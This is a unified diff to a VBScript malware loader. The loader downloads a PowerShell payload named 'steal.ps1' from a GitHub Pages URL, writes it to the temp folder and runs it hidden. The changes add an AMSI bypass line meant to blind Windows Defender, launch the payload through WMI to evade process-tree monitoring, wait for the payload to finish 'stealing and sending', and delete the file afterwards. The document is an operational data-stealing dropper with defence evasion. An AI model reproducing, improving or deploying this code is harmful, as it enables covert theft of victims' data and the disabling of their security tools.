@@ -10,7 +10,7 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' 1. Download steal.ps1 from your GitHub
+' 1. Download the exact ives/friend steal.ps1 from your GitHub
 xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
 xh.Send
 
@@ -18,17 +18,28 @@ If xh.Status = 200 Then
     ps1Content = xh.responseText
     Set xh = Nothing
 
-    ' 2. Save steal.ps1 to temp
+    ' 2. Save to temp
     Dim tempPs1 : tempPs1 = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
     Dim f : Set f = fso.CreateTextFile(tempPs1, True)
     f.Write ps1Content
     f.Close
 
-    ' 3. Run PowerShell and WAIT
-    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """"
-    sh.Run finalCmd, 0, True
+    ' 3. AMSI Bypass (Blinds Defender to the PowerShell execution)
+    Dim amsi : amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
+
+    ' 4. Run via WMI with AMSI bypass (Bypasses parent-child monitoring)
+    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command """ & amsi & " & """ & tempPs1 & """"
     
-    ' 4. Cleanup
+    Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Dim proc: Set proc = wmi.Get("Win32_Process")
+    proc.Create finalCmd, Null, Null
+    
+    ' 5. Wait 20 seconds for the heavy script to finish stealing and sending
+    Dim w: w = Timer()
+    Do While Timer() - w < 20
+    Loop
+    
+    ' 6. Cleanup
     fso.DeleteFile tempPs1, True
 End If
 
